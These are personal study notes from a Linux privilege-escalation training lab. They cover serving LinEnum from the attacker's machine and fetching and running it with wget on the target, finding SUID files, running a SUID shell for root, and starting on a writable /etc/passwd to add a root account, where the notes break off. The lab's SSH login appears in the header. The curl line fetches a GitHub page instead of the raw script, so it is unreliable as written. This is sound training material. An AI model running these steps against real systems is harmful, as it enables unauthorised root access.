Common Linux Privesc
####################
:Author: David Boyd
:Date: 2020-06-02
:SSH User: user3
:SSH Password: password

[Task 4] Enumeration
====================

LinEnum
	a bash script that perfoms common commands related to privilege escalation.

	Saves time (allowing more effort to be put toward getting root).

Get LinEnum
-----------

curl -O https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

	- -O, --remote-name

		-O'riginal'-rem'O'te-name.  Writes output to a local file with the same
		name as the original remote name.

Push LinEnum on TM (Target Machine)
-----------------------------------

Steps
~~~~~

1.	Setup Python server on your machine
2.	from TM (target machine), wget your.Machine.IP.addr:port/file.sh
3.	from TM, chmod +x file.sh && run file.sh

Python3
~~~~~~~

http.server    (import http.server)
	this module defines classes for implementing HTTP servers (Web servers).

	-m

Issues
~~~~~~
:Issue: Python2 code is deprecated.
:Tricks: Use the **2to3** utility to convert Python2 prgms to Python3.
:Solution: The *SimpleHTTPServer* module has been merged into the
           *http.server* in Python 3.0

.. code-block:: Python

	python3 -m http.server 8000

	python -m SimpleHTTPServer 8000

The http.server is invoked directly using the *-m* switch of the interpreter
with a port number argument.  **This serves files relative to the currect
directory.**  // Think: -m = "main directory"

Sandbox
~~~~~~~

.. image:: ./http.server_python3_file-xfer.png

.. code-block:: Python

	# My machine
	python3 -m http.server 8000

	# TM
	wget my.ip.addr.ess:8000/LinEnum.sh
	chmod +x LinEnum.sh
	./LinEnum.sh


Questions
---------
:Notes: https://regexone.com for grep refresher
:grep: {m} = matching repreated characters

.. code-block:: Bash

	# What is the target's hostname?
	hostname

	# Look at the output of /etc/passwd,
	# how many "user[x]" are there on the system?
	### Method 1
	cat /etc/passwd | grep .user.
	### Method 2
	cat /etc/passwd | grep user[0-9] | cut -d ':' -f1

	# How many available shells are there on the system?
	cat -n /etc/shells

	# What critical file has had it permissions changed to allow some users to
	# write to it?
	### > critical files include /etc/, /var/
	### > permissions change would typically include user groups' changes
	ls -l | grep -E "\-[rwx-]{4}w]"

[Task 5] Abusing SUID/SGID Files
================================
:rwx-: read, write, execute, NO permissions
:--s--S--t: SUID w/ execution, SUID w/o exec, sTicky bit
:NOTE: GUID/SGID are used interchangably.

.. image:: ./special-permissions.png

First step in privilege escalation exploitation is to check for files with
SUID/SGID bit set.  This means that the file(s) can be run with the permissions
of the file(s) owner/group.

SUID
----
:SUID: https://linuxhandbook.com/suid-sgid-sticky/
:s: stands for 'Set'
:SUID: SetUID

SUID (Set User ID) binary
	a special type of file permission given to a file (everything in Linux is a
	file!).  Normally in Linux/UNIX when a program runs, it inherit's access
	permissions from the logged in user.  SUID is defined as *giving temporary
	permissions to a user to run a program/file with the permissions of the
	file owner, rather than that of the user who runs it.* In simple words,
	**users will get owner's permsissions as well as owner UID and GID when
	executing a file/program/command**.

:SUID with execute permissions: -rws------
:SUID without execute permissions: -rwS------
:Change SUID execute permissions: chmod u+[sS] filename

SGID (Set Group ID)
	any user executing the file will have the same permissions as the *group
	owner* of the file.

:SGID with execute permissions: ----rws---
:SGID without execute permissions: ----rwS---
:Change SGID execute permissions: chmod g+[sS] filename
:Example: ls -l /var/local
:Practical Usage: Samba server for sharing files on local netw.

Where is SUID used?
~~~~~~~~~~~~~~~~~~~

	1.	Where root login is required to execute some cmds/prgms/scripts.
	2.	Where you don't want to give credentials of a particular user, but want
	    to run some prgms as the owner.
	3.	Where you don't want to use 'sudo' cmd, but want to give execute
	    permission for a file/script.

SUID/SGID/sTicky bit for a file
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.. code-block:: Bash

	###
	### Setup
	###
	# method 1
	chmod u+s file.name (SUID)
	chmod g+s file.name (SGID)
	chmod +t dir.name   (sTicky bit)

	# method 2
	chmod 4nnn file.name    # where nnn is [0-7] respectively.

	###
	### Remove
	###
	# method 1
	chmod u-s file.name
	chmod g-s file.name
	chmod -t dir.name   (sTicky bit)

	# method 2
	chmod 0nnn file.name    # where nnn is [0-7] respectively.
	chmod 0nnn file.name    # SGID is the same as SUID to rm
	chmod 0nnn file.name    # sTicky bit is the same as SUID to rm

	###
	### Find SUID/SGID files
	###
	find / -perm /4000      # SUID
	find / -perm /2000      # SGID
	find / -perm /1000      # sTicky bit
	# [THM] method
	find / -perm -u=s -type f 2>/dev/null

Bonus
~~~~~
:d--------t: sTicky bit
:T/t: sTick bit ONLY, sticky bit +x

Sticky Bit
	only file owner(s) can mv/rm dir/files within a directory.  **Sticky bits
	only works with DIRECTORIES!!!**

Questions
---------

.. code-block:: Bash

	#1 What is the path of the file in user3's directory that stands out to
	# you?
	ls
	ls -al
	# find doesn't show s/g/
	find ./ -perm /4000
	find / -perm /4000 2>/dev/null
	find / -perm /4000 -o -perm /2000 -o -perm /1000 2>/dev/null

	# We know that "shell" is a SUID bit file, therefore running it will run
	# the script as a root user!  Lets run it!  We can do this by running:
	# "./shell"
	<no answer needed>

	# Congratulations!  You should now have a shell as root user, well done!
	<wtf?>

[Task 6] Exploiting Writeable /etc/passwd
=========================================

/etc/passwd
	a *plain text file* that contains a list of **system's accounts (user ID,
	group ID, home directory, shell, and more)**.  Useful to map user IDs to
	user names.  Write access is limited to superuser/root account.


IF (non-root user has write access) {
	VULNERABILITY;
	vulnerability {
		adduser root2;  // root user that we can access
	}
}

Understanding /etc/passwd format
--------------------------------


